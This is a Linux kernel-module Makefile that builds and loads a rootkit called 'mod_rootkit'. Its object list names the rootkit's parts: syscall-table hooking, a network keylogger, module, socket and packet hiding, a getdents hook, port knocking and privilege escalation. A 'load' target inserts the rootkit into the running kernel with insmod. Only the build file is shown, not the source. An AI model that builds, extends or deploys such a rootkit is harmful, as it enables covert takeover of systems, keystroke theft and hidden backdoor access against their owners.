obj-m += mod_rootkit.o

mod_rootkit-y += core.o sys_call_table.o network_keylog.o udp_server.o module_hiding.o getdents_hook.o 
mod_rootkit-y += socket_hiding.o packet_hiding.o port_knocking.o privilege_escalation.o include.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	@echo "Module \"mod_rootkit.ko\" built."

load:
	insmod /lib/modules/$(shell uname -r)/kernel/net/ipv4/netfilter/nf_reject_ipv4.ko
	@echo "Loaded module \"nf_reject_ipv4.ko\"."
	insmod /lib/modules/$(shell uname -r)/kernel/net/ipv6/netfilter/nf_reject_ipv6.ko
	@echo "Loaded module \"nf_reject_ipv6.ko\"."
	insmod mod_rootkit.ko
	@echo "Loaded module \"mod_rootkit.ko\"."

unload:
	rmmod mod_rootkit
	@echo "Unloaded module \"mod_rootkit\"."
	rmmod nf_reject_ipv4
	@echo "Unloaded module \"nf_reject_ipv4\"."
	rmmod nf_reject_ipv6
	@echo "Unloaded module \"nf_reject_ipv6\"."

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean